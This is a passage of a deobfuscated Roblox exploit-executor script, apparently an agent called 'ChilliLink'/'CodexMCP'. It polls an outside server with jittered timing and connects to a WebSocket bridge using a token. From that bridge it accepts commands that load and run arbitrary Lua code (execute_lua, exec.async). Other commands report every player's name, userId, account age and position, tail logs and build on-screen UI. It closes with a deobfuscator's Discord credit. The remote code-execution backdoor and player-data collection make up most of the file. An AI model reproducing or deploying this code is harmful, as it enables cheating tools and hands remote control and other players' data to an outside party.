	local tbl541 = { AnchorPoint = true, CanvasPosition = true }

	local tbl542 = {
		CornerRadius = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
	}

	local tbl543 = {
		AutomaticCanvasSize = Enum.AutomaticSize,
		AutomaticSize = Enum.AutomaticSize,
		FillDirection = Enum.FillDirection,
		Font = Enum.Font,
		HorizontalAlignment = Enum.HorizontalAlignment,
		LineJoinMode = Enum.LineJoinMode,
		SortOrder = Enum.SortOrder,
		TextTruncate = Enum.TextTruncate,
		TextXAlignment = Enum.TextXAlignment,
		TextYAlignment = Enum.TextYAlignment,
		VerticalAlignment = Enum.VerticalAlignment,
	}

	local function func785(tbl544)
		if type(tbl544) ~= "table" then
			return nil
		end
		local num165 = tonumber(tbl544[1] or tbl544.r)
		local num166 = tonumber(tbl544[2] or tbl544.g)
		local num167 = tonumber(tbl544[3] or tbl544.b)
		if not num165 or not num166 or not num167 then
			return nil
		end

		if num165 <= 1 and num166 <= 1 and num167 <= 1 then
			return Color3.new(num165, num166, num167)
		end
		local floor = math.floor
		return Color3.fromRGB(math.floor(func771(num165, 0, 255, 0)), math.floor(func771(num166, 0, 255, 0)), floor(func771(num167, 0, 255, 0)))
	end

	local function func786(tbl545)
		if type(tbl545) ~= "table" then
			return nil
		end
		return UDim2.new(tonumber(tbl545[1] or tbl545.xScale) or 0, tonumber(tbl545[2] or tbl545.xOffset) or 0, tonumber(tbl545[3] or tbl545.yScale) or 0, tonumber(tbl545[4] or tbl545.yOffset) or 0)
	end

	local function func787(tbl546)
		if type(tbl546) ~= "table" then
			return nil
		end
		return Vector2.new(tonumber(tbl546[1] or tbl546.x) or 0, tonumber(tbl546[2] or tbl546.y) or 0)
	end

	local function func788(tbl547)
		if type(tbl547) == "number" then
			return UDim.new(0, tbl547)
		end

		if type(tbl547) ~= "table" then
			return nil
		end
		return UDim.new(tonumber(tbl547[1] or tbl547.scale) or 0, tonumber(tbl547[2] or tbl547.offset) or 0)
	end

	local function func789(param466, param467)
		if tbl539[param466] then
			return func785(param467)
		end

		if tbl540[param466] then
			return func786(param467)
		end

		if tbl541[param466] then
			return func787(param467)
		end

		if tbl542[param466] then
			return func788(param467)
		end

		if tbl543[param466] then
			if typeof(param467) == "EnumItem" then
				return param467
			end
			return tbl543[param466][tostring(param467):match("([^%.]+)$")]
		end

		return param467
	end

	local function func790(tbl548, list97)
		if type(list97) ~= "table" then
			return { applied = 0, rejected = {} }
		end
		local tbl549 = {}
		local n16 = 0

		for k, value613 in pairs(list97) do
			if not tbl538[k] then
				table.insert(tbl549, { property = tostring(k), reason = "not_allowed" })
			else
				local flag705 = func789(k, value613)

				if flag705 == nil then
					table.insert(tbl549, { property = k, reason = "invalid_value" })
				else
					local ok, result = pcall(function()
						tbl548[k] = flag705
					end)

					if ok then
						n16 += 1
					else
						table.insert(tbl549, { property = k, reason = tostring(result) })
					end
				end
			end
		end

		return { applied = n16, rejected = tbl549 }
	end

	local function func791()
		return localPlayer2:FindFirstChildOfClass("PlayerGui") or localPlayer2:WaitForChild("PlayerGui", 10)
	end

	local function func792(param468)
		local result106 = func791()
		if not result106 then
			return nil, "PlayerGui is unavailable"
		end
		local codexMCP = result106:FindFirstChild("CodexMCP")

		if not codexMCP and param468 then
			codexMCP = Instance.new("ScreenGui")
			codexMCP.Name = name
			codexMCP.ResetOnSpawn = false
			codexMCP.IgnoreGuiInset = false
			codexMCP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			codexMCP.Parent = result106
		end

		return codexMCP
	end

	local function func793(param469)
		local obj117, flag706 = func792(false)
		if not obj117 then
			return nil, flag706 or "managed UI does not exist"
		end
		local obj118 = func770(param469)
		if obj118 == "" or obj118 == name then
			return obj117
		end

		for match in obj118:gmatch("[^%.]+") do
			if match == name then
				continue
			end
			obj117 = obj117:FindFirstChild(match)
			if not obj117 then
				return nil, "managed UI path not found: " .. match
			end
		end

		return obj117
	end

	local tbl550 = { Activated = true, MouseButton1Click = true, FocusLost = true }

	local function func794(tbl551, list98)
		if type(list98) ~= "table" then
			return
		end

		for _, item212 in ipairs(list98) do
			if tbl550[item212] then
				local ok, result = pcall(function()
					return tbl551[item212]
				end)

				if ok and result and type(result.Connect) == "function" then
					local connection = result:Connect(function(...)
						local tbl552 = { ... }
						func779("ui." .. item212, { path = func776(tbl551), name = tbl551.Name, className = tbl551.ClassName, arguments = func777(tbl552) })
					end)

					table.insert(tbl528, connection)
				end
			end
		end
	end

	local value614 = nil

	value614 = function(param470, parent, num168, str92)
		if num168 > 10 then
			error("UI tree exceeds maximum depth of 10")
		end

		if str92.count >= 250 then
			error("UI tree exceeds maximum of 250 objects")
		end

		if type(param470) ~= "table" then
			error("UI node must be an object")
		end

		local uiClassIsNotAllowed = func770(param470.class or param470.className)

		if not tbl537[uiClassIsNotAllowed] then
			error("UI class is not allowed: " .. uiClassIsNotAllowed)
		end

		str92.count = str92.count + 1
		local instance = Instance.new(uiClassIsNotAllowed)
		instance.Name = func770(param470.name) ~= "" and func770(param470.name):sub(1, 64) or uiClassIsNotAllowed .. str92.count
		local value615 = func790(instance, param470.props)
		instance.Parent = parent
		func794(instance, param470.events)
		local children = type(param470.children) == "table" and param470.children or {}

		for _, child in ipairs(children) do
			value614(child, instance, num168 + 1, str92)
		end

		return instance, value615
	end

	local value616 = nil

	value616 = function(instance33, num169, param471)
		local value617 = func783(instance33)
		if num169 >= param471 then
			value617.truncated = #instance33:GetChildren() > 0
			return value617
		end
		value617.children = {}

		for _, child in ipairs(instance33:GetChildren()) do
			table.insert(value617.children, value616(child, num169 + 1, param471))
		end

		return value617
	end

	local n16 = 60000
	local n17 = 80
	local tbl553 = {}

	local function func795(...)
		local packed8 = table.pack(...)
		local tbl554 = {}

		for i = 1, select("#", ...) do
			local func796 = tostring
			local value618 = select(i, table.unpack(packed8, 1, packed8.n))
			tbl554[i] = func796(value618)
		end

		return table.concat(tbl554, " ")
	end

	local function func797(flag707, flag708)
		local str93 = tostring(flag707 or "")

		if str93:match("^%s*$") then
			error("Code is empty", 0)
		end

		local str94 = "=" .. tostring(flag708 or "WebConsole"):sub(1, 60)
		local chunk, value619 = loadstring(str93, str94)

		if not chunk then
			local chunk2 = loadstring("return " .. str93, str94)
			if chunk2 then
				return chunk2
			end
			error("Syntax error: " .. tostring(value619), 0)
		end

		return chunk
	end

	local function func798(callback28)
		local env = getfenv(0)

		local obj = setmetatable({}, {
			__index = env,
			__newindex = function(param472, param473, param474)
				env[param473] = param474
			end,
		})

		rawset(obj, "print", function(...)
			local packed9 = table.pack(...)
			callback28("print", func795(...))

			if flag696 then
				print(table.unpack(packed9, 1, packed9.n))
			end
		end)

		rawset(obj, "warn", function(...)
			local packed10 = table.pack(...)
			callback28("warn", func795(...))

			if flag696 then
				warn(table.unpack(packed10, 1, packed10.n))
			end
		end)

		return obj
	end

	local function func799(param475)
		local kind = typeof(param475)
		local ok, result = pcall(tostring, param475)

		return {
			type = kind,
			text = (ok and tostring(result) or "<unprintable>"):sub(1, 4000),
			value = kind ~= "nil" and func777(param475) or nil,
		}
	end

	local function func800(tbl555, param476, param477, flag709)
		local tbl556 = {}
		local tbl557 = {}

		for i = 2, tbl555.n do
			tbl556[i - 1] = func777(tbl555[i])
			tbl557[i - 1] = func799(tbl555[i])
		end

		return {
			output = table.concat(param477, "\n"),
			outputTruncated = flag709 or nil,
			returns = tbl556,
			returnsInfo = tbl557,
			returnCount = tbl555.n - 1,
			elapsedMs = param476,
		}
	end

	local function func801(param478)
		return debug.traceback(tostring(param478), 2)
	end

	local function func802(list99)
		if #list99.pending == 0 then
			return
		end
		local pending = list99.pending
		list99.pending = {}
		func779("exec.output", { runId = list99.id, label = list99.label, lines = pending })
	end

	local function func803(player10, flag710)
		local character = player10.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

		return {
			name = player10.Name,
			displayName = player10.DisplayName,
			userId = player10.UserId,
			accountAge = player10.AccountAge,
			team = player10.Team and player10.Team.Name or nil,
			neutral = player10.Neutral,
			character = character and character.Name or nil,
			health = humanoid and humanoid.Health or nil,
			maxHealth = humanoid and humanoid.MaxHealth or nil,
			position = flag710 and humanoidRootPart and func777(humanoidRootPart.Position) or nil,
		}
	end

	local tbl558 = {
		["system.ping"] = function(param479)
			return { pong = true, echo = param479, clientTime = DateTime.now().UnixTimestampMillis }
		end,
		["game.info"] = function()
			return {
				placeId = game.PlaceId,
				gameId = game.GameId,
				jobId = game.JobId,
				placeVersion = game.PlaceVersion,
				privateServerId = game.PrivateServerId,
				privateServerOwnerId = game.PrivateServerOwnerId,
				playerCount = #Players2:GetPlayers(),
				localPlayer = { name = localPlayer2.Name, displayName = localPlayer2.DisplayName, userId = localPlayer2.UserId },
			}
		end,
		execute_lua = function(param480)
			local value620 = func797(param480.code, param480.label)
			local tbl559 = {}
			local n18 = 0
			local flag711 = false

			local value621 = func798(function(flag712, str95)
				if flag711 then
					return
				end
				local list100 = (flag712 == "warn" and "[warn] " or "") .. str95
				n18 = n18 + #list100 + 1

				if n16 < n18 then
					flag711 = true
					table.insert(tbl559, "... output truncated ...")
					return
				end

				table.insert(tbl559, list100)
			end)

			setfenv(value620, value621)
			local now = os.clock()
			local packed11 = table.pack(xpcall(value620, func801))
			local n19 = math.floor((os.clock() - now) * 1000 + 0.5)

			if not packed11[1] then
				error(string.format("Runtime error: %s\n--- output ---\n%s", tostring(packed11[2]), table.concat(tbl559, "\n"):sub(-20000)), 0)
			end

			return func800(packed11, n19, tbl559, flag711)
		end,
		["exec.async"] = function(param481)
			local value622 = func797(param481.code, param481.label)
			local tbl560 = { id = HttpService2:GenerateGUID(false):sub(1, 8) }
			tbl560.label = tostring(param481.label or "Script"):sub(1, 60)
			tbl560.startedAt = os.clock()
			tbl560.pending = {}
			tbl560.lineCount = 0
			tbl560.dropped = 0

			local value623 = func798(function(param482, obj119)
				tbl560.lineCount = tbl560.lineCount + 1
				if #tbl560.pending >= n17 then
					tbl560.dropped = tbl560.dropped + 1
					return
				end
				table.insert(tbl560.pending, { kind = param482, text = obj119:sub(1, 1000) })
			end)

			setfenv(value622, value623)
			tbl553[tbl560.id] = tbl560

			task.spawn(function()
				while tbl553[tbl560.id] == tbl560 do
					task.wait(0.3)

					if tbl560.dropped > 0 then
						table.insert(tbl560.pending, { kind = "warn", text = string.format("... %d line(s) skipped ...", tbl560.dropped) })
						tbl560.dropped = 0
					end

					func802(tbl560)
				end
			end)

			tbl560.thread = task.defer(function()
				local packed12 = table.pack(xpcall(value622, func801))
				if tbl553[tbl560.id] ~= tbl560 then
					return
				end
				tbl553[tbl560.id] = nil
				func802(tbl560)
				local startedAt = tbl560.startedAt
				local n18 = math.floor((os.clock() - startedAt) * 1000 + 0.5)
				local tbl561 = { runId = tbl560.id, label = tbl560.label, ok = packed12[1] == true, elapsedMs = n18 }

				if packed12[1] then
					local value624 = func800(packed12, n18, {}, false)
					tbl561.returnsInfo = value624.returnsInfo
					tbl561.returnCount = value624.returnCount
				else
					tbl561.error = tostring(packed12[2]):sub(1, 4000)
				end

				func779("exec.finished", tbl561)
			end)

			return { runId = tbl560.id, label = tbl560.label }
		end,
		["exec.cancel"] = function(param483)
			local entry58 = tbl553[tostring(param483.runId or "")]
			if not entry58 then
				return { cancelled = false, reason = "not running" }
			end
			tbl553[entry58.id] = nil
			pcall(task.cancel, entry58.thread)
			func802(entry58)
			local startedAt = entry58.startedAt

			func779("exec.finished", {
				runId = entry58.id,
				label = entry58.label,
				ok = false,
				cancelled = true,
				error = "Cancelled from the web console",
				elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
			})

			return { cancelled = true, runId = entry58.id }
		end,
		["exec.list"] = function()
			local tbl562 = {}

			for k, value625 in pairs(tbl553) do
				local startedAt = value625.startedAt

				table.insert(tbl562, {
					runId = k,
					label = value625.label,
					lines = value625.lineCount,
					elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
				})
			end

			return { count = #tbl562, runs = tbl562 }
		end,
		["console.tail"] = function(param484)
			local logHistory = game:GetService("LogService"):GetLogHistory()
			local value626 = func771(param484.limit, 1, 500, 200)
			local n18 = tonumber(param484.since) or 0
			local tbl563 = {}

			for i = #logHistory, 1, -1 do
				local entry59 = logHistory[i]

				if not (entry59.timestamp <= n18 or #tbl563 >= value626) then
					table.insert(tbl563, 1, {
						message = tostring(entry59.message):sub(1, 1000),
						kind = entry59.messageType.Name,
						time = entry59.timestamp,
					})

					continue
				end

				break
			end

			return { count = #tbl563, entries = tbl563, latest = logHistory[#logHistory] and logHistory[#logHistory].timestamp or n18 }
		end,
		["players.list"] = function(param485)
			local tbl564 = {}
			local includePosition2 = param485.includePosition ~= false

			for _, player in ipairs(Players2:GetPlayers()) do
				table.insert(tbl564, func803(player, includePosition2))
			end

			table.sort(tbl564, function(param486, param487)
				return string.lower(param486.name) < string.lower(param487.name)
			end)

			return { count = #tbl564, players = tbl564 }
		end,
		["players.get"] = function(param488)
			local query = param488.query
			local num170 = tonumber(query)
			local lowered8 = string.lower(func770(query))

			for _, player in ipairs(Players2:GetPlayers()) do
				if num170 and player.UserId == num170 or string.lower(player.Name) == lowered8 or string.lower(player.DisplayName) == lowered8 then
					return func803(player, true)
				end
			end

			error("player not found: " .. tostring(query))
		end,
		["characters.list"] = function()
			local tbl565 = {}

			for _, player in ipairs(Players2:GetPlayers()) do
				local character = player.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

				table.insert(tbl565, {
					player = player.Name,
					userId = player.UserId,
					characterPath = character and func776(character) or nil,
					health = humanoid and humanoid.Health or nil,
					maxHealth = humanoid and humanoid.MaxHealth or nil,
					walkSpeed = humanoid and humanoid.WalkSpeed or nil,
					jumpPower = humanoid and humanoid.JumpPower or nil,
					moveDirection = humanoid and func777(humanoid.MoveDirection) or nil,
					state = humanoid and tostring(humanoid:GetState()) or nil,
					position = humanoidRootPart and func777(humanoidRootPart.Position) or nil,
					velocity = humanoidRootPart and func777(humanoidRootPart.AssemblyLinearVelocity) or nil,
				})
			end

			return { count = #tbl565, characters = tbl565 }
		end,
		["workspace.summary"] = function(param489)
			local n18 = math.floor(func771(param489.maxDescendants, 1, 5000, 2000))
			local tbl566 = {}
			local tbl567 = {}

			for _, child in ipairs(Workspace:GetChildren()) do
				table.insert(tbl567, func783(child))
			end

			local value627 = func784(Workspace, n18, function(param490)
				tbl566[param490.ClassName] = (tbl566[param490.ClassName] or 0) + 1
				return false
			end)

			return {
				topLevel = tbl567,
				topLevelCount = #tbl567,
				scannedDescendants = value627,
				truncated = value627 >= n18,
				classCounts = tbl566,
			}
		end,
		["instance.find"] = function(param491)
			local flag713, value628 = func780(param491.root or "Workspace")

			if not flag713 then
				error(value628)
			end

			local lowered9 = string.lower(func770(param491.nameContains))
			local flag714 = func770(param491.className)
			local n18 = math.floor(func771(param491.limit, 1, 200, 50))
			local tbl568 = {}

			local value629 = func784(flag713, math.floor(func771(param491.scanLimit, 1, 10000, 3000)), function(instance34)
				local flag715 = lowered9 == "" or string.find(string.lower(instance34.Name), lowered9, 1, true) ~= nil
				local flag716 = false

				if flag714 ~= "" and instance34.ClassName ~= flag714 then
					pcall(function()
						flag716 = instance34:IsA(flag714)
					end)
				end

				if flag715 and (flag714 == "" or instance34.ClassName == flag714 or flag716) then
					table.insert(tbl568, func783(instance34))
				end

				return #tbl568 >= n18
			end)

			return { root = func776(flag713), scanned = value629, count = #tbl568, matches = tbl568 }
		end,
		["instance.children"] = function(param492)
			local obj120, value630 = func780(param492.path)

			if not obj120 then
				error(value630)
			end

			local n18 = math.floor(func771(param492.limit, 1, 500, 100))
			local children = obj120:GetChildren()
			local tbl569 = {}

			for i = 1, math.min(#children, n18) do
				table.insert(tbl569, func783(children[i]))
			end

			return { parent = func783(obj120), total = #children, returned = #tbl569, children = tbl569 }
		end,
		["instance.inspect"] = function(list101)
			local list102, value631 = func780(list101.path)

			if not list102 then
				error(value631)
			end

			local tbl570 = {}

			for _, item213 in ipairs(tbl534) do
				tbl570[item213] = true
			end

			if type(list101.properties) == "table" then
				for _, property in ipairs(list101.properties) do
					tbl570[tostring(property)] = true
				end
			end

			local tbl571 = {}
			local tbl572 = {}

			for k in pairs(tbl570) do
				local value632, value633 = func782(list102, k)

				if value633 then
					tbl572[k] = value633
				else
					tbl571[k] = value632
				end
			end

			return {
				instance = func783(list102),
				attributes = func777(list102:GetAttributes()),
				tags = func777(list102:GetTags()),
				childCount = #list102:GetChildren(),
				properties = tbl571,
				unavailable = tbl572,
			}
		end,
		["instance.attributes"] = function(param493)
			local obj121, value634 = func780(param493.path)

			if not obj121 then
				error(value634)
			end

			return { instance = func783(obj121), attributes = func777(obj121:GetAttributes()) }
		end,
		["camera.get"] = function()
			local currentCamera = Workspace.CurrentCamera

			if not currentCamera then
				error("CurrentCamera is unavailable")
			end

			return {
				path = func776(currentCamera),
				cameraType = tostring(currentCamera.CameraType),
				fieldOfView = currentCamera.FieldOfView,
				viewportSize = func777(currentCamera.ViewportSize),
				cframe = func777(currentCamera.CFrame),
				focus = func777(currentCamera.Focus),
				subject = func777(currentCamera.CameraSubject),
			}
		end,
		["telemetry.snapshot"] = function()
			local result = RunService2.RenderStepped:Wait()
			local totalMemoryUsageMb = nil

			pcall(function()
				totalMemoryUsageMb = game:GetService("Stats"):GetTotalMemoryUsageMb()
			end)

			return {
				fpsEstimate = result > 0 and math.floor(1 / result + 0.5) or nil,
				frameDeltaMs = result * 1000,
				memoryMb = totalMemoryUsageMb,
				playerCount = #Players2:GetPlayers(),
				placeId = game.PlaceId,
				jobId = game.JobId,
				distributedGameTime = Workspace.DistributedGameTime,
				timestamp = DateTime.now().UnixTimestampMillis,
			}
		end,
		["ui.create"] = function(param494)
			local obj122, value635 = func792(true)

			if not obj122 then
				error(value635)
			end

			if param494.replace ~= false then
				func772(tbl528)

				for _, child in ipairs(obj122:GetChildren()) do
					child:Destroy()
				end
			end

			local tbl573 = { count = 0 }
			local value636, value637 = value614(param494.tree, obj122, 1, tbl573)
			return { created = func783(value636), objectCount = tbl573.count, propertyResult = value637 }
		end,
		["ui.update"] = function(param495)
			local flag717, value638 = func793(param495.path)

			if not flag717 then
				error(value638)
			end

			return { instance = func783(flag717), result = func790(flag717, param495.props) }
		end,
		["ui.delete"] = function(param496)
			local flag718 = func770(param496.path)
			local obj123, value639 = func793(flag718)

			if not obj123 then
				if flag718 == "" then
					return { deleted = false, reason = "managed UI does not exist" }
				end
				error(value639)
			end

			func772(tbl528)
			local value640 = func776(obj123)
			obj123:Destroy()
			return { deleted = true, path = value640 }
		end,
		["ui.list"] = function(param497)
			local flag719, flag720 = func792(false)
			if not flag719 then
				return { exists = false, reason = flag720 or "managed UI does not exist" }
			end
			local n18 = math.floor(func771(param497.maxDepth, 1, 10, 6))
			return { exists = true, tree = value616(flag719, 0, n18) }
		end,
		["ui.notify"] = function(param498)
			local obj124, value641 = func792(true)

			if not obj124 then
				error(value641)
			end

			local notifications = obj124:FindFirstChild("Notifications")

			if not notifications then
				notifications = Instance.new("Frame")
				notifications.Name = "Notifications"
				notifications.AnchorPoint = Vector2.new(1, 0)
				notifications.Position = UDim2.new(1, -16, 0, 16)
				notifications.Size = UDim2.fromOffset(360, 500)
				notifications.BackgroundTransparency = 1
				notifications.Parent = obj124
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.Padding = UDim.new(0, 8)
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Parent = notifications
			end

			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Notification_" .. HttpService2:GenerateGUID(false)
			textLabel.Size = UDim2.fromOffset(340, 64)
			textLabel.BackgroundColor3 = func785(param498.color) or Color3.fromRGB(25, 35, 52)
			textLabel.BackgroundTransparency = 0.08
			textLabel.Text = tostring(param498.text):sub(1, 500)
			textLabel.TextColor3 = Color3.fromRGB(240, 247, 255)
			textLabel.TextSize = 16
			textLabel.Font = Enum.Font.GothamSemibold
			textLabel.TextWrapped = true
			textLabel.Parent = notifications
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(0, 10)
			uiCorner.Parent = textLabel
			local value642 = func771(param498.duration, 0.5, 30, 4)

			task.delay(value642, function()
				if textLabel.Parent then
					textLabel:Destroy()
				end
			end)

			return { shown = true, name = textLabel.Name, duration = value642 }
		end,
	}

	local function func804(param499)
		local str96 = tostring(param499.requestId or "")
		local unknownOrDisallowedMethod = tostring(param499.method or "")
		local entry60 = tbl558[unknownOrDisallowedMethod]
		if str96 == "" then
			return
		end

		if not entry60 then
			func778({
				type = "rpc_result",
				requestId = str96,
				success = false,
				error = "Unknown or disallowed method: " .. unknownOrDisallowedMethod,
			})

			return
		end

		task.spawn(function()
			local ok, result = xpcall(function()
				return entry60(type(param499.params) == "table" and param499.params or {})
			end, function(param500)
				return debug.traceback(tostring(param500), 2)
			end)

			if ok then
				func778({ type = "rpc_result", requestId = str96, success = true, data = func777(result) })
			else
				func778({ type = "rpc_result", requestId = str96, success = false, error = tostring(result):sub(1, 2000) })
			end
		end)
	end

	local function func805(param501)
		local ok, result = pcall(function()
			return HttpService2:JSONDecode(tostring(param501))
		end)

		if not ok or type(result) ~= "table" then
			func769("Invalid JSON message")
			return
		end

		if result.type == "identify_ok" then
			func768("Connected to bridge. Client ID:", tostring(result.clientId))
			local tbl574 = {}

			for k in pairs(tbl558) do
				table.insert(tbl574, k)
			end

			table.sort(tbl574)
			func779("agent.ready", { clientId = result.clientId, methods = tbl574, playerCount = #Players2:GetPlayers() })
			return
		end

		if result.type == "pong" then
			func768("PONG", tostring(result.seq or ""))
			return
		end

		if result.type == "rpc_request" then
			func804(result)
			return
		end

		if result.type == "identify_error" then
			func769("Bridge rejected identity:", tostring(result.error))
		end
	end

	local function func806()
		flag699 = false
		func772(tbl527)
		if not obj114 then
			return
		end

		pcall(function()
			if type(obj114.Close) == "function" then
				obj114:Close()
			elseif type(obj114.close) == "function" then
				obj114:close()
			end
		end)

		obj114 = nil
	end

	local function func807()
		local func808, value643 = func773()
		if not func808 then
			func769("No supported WebSocket API found")
			return false
		end
		n14 += 1
		local flag721 = n14
		func768("Connecting to", str89, "using", value643)

		local ok, result = pcall(function()
			return func808(str89)
		end)

		if not ok or not result then
			func769("Connection failed:", tostring(result))
			return false
		end
		obj114 = result
		flag699 = true
		local onMessage = func774(obj114, "OnMessage", "MessageReceived")
		local onClose = func774(obj114, "OnClose", "Closed", "OnDisconnect")
		local onError = func774(obj114, "OnError", "Error")

		local value644 = func775(onMessage, function(param502)
			if flag721 == n14 then
				func805(param502)
			end
		end)

		if value644 then
			table.insert(tbl527, value644)

			local value645 = func775(onClose, function(...)
				if flag721 == n14 then
					flag699 = false
					func769("Socket closed", ...)
				end
			end)

			if value645 then
				table.insert(tbl527, value645)
			end

			local value646 = func775(onError, function(...)
				if flag721 == n14 then
					func769("Socket error", ...)
					flag699 = false
				end
			end)

			if value646 then
				table.insert(tbl527, value646)
			end

			local flag722, value647 = func778({
				type = "identify",
				clientType = "roblox",
				token = str88,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				userId = localPlayer2.UserId,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = str91,
			})

			if not flag722 then
				func769(value647)
				flag699 = false
			end

			task.spawn(function()
				while flag698 and flag699 and flag721 == n14 do
					task.wait(20)

					if flag698 and flag699 and flag721 == n14 then
						n15 += 1
						local flag723, value648 = func778({ type = "ping", seq = n15 })

						if not flag723 then
							func769("Heartbeat failed:", tostring(value648))
							flag699 = false
						end
					end
				end
			end)

			while flag698 and flag699 and flag721 == n14 do
				task.wait(0.5)
			end

			if flag721 == n14 then
				func806()
			end

			return true
		end

		func769("Socket has no supported message event")
		func806()
		return false
	end

	table.insert(tbl526, Players2.PlayerAdded:Connect(function(player)
		if flag697 then
			func779("player.added", func803(player, true))
		end
	end))

	table.insert(tbl526, Players2.PlayerRemoving:Connect(function(player)
		if flag697 then
			func779("player.removing", func803(player, true))
		end
	end))

	genv.StopChilliLink = function()
		if not flag698 then
			return
		end
		func768("Stopping agent")
		flag698 = false
		n14 += 1
		func772(tbl526)
		func772(tbl528)
		func806()
	end

	local request_2 = syn and syn.request or http_request or request or request_ and request_.request or fluxus and fluxus.request

	local function func809()
		if type(request_2) ~= "function" then
			return nil
		end

		local ok, result = pcall(function()
			return HttpService2:JSONEncode({
				token = str88,
				userId = localPlayer2.UserId,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = str91,
			})
		end)

		if not ok then
			return nil
		end
		local ok2, result2 = pcall(request_2, { Url = str90, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })
		if not ok2 or type(result2) ~= "table" or tonumber(result2.StatusCode) ~= 200 then
			return nil
		end

		local ok3, result3 = pcall(function()
			return HttpService2:JSONDecode(tostring(result2.Body))
		end)

		if ok3 and type(result3) == "table" then
			return result3
		end
		return nil
	end

	task.spawn(function()
		while flag698 do
			local result107 = func809()
			local n18 = 60

			if result107 then
				n18 = func771(result107.interval, 5, 600, 60)

				if result107.connect == true and not flag700 and not flag699 then
					flag700 = true

					task.spawn(function()
						pcall(func807)
						flag700 = false
					end)
				end
			end

			task.wait(n18 * (0.85 + math.random() * 0.3))
		end

		func768("Agent stopped")
	end)
end

-- deobfuscated by SL -> https://discord.gg/x7YbZeezpm
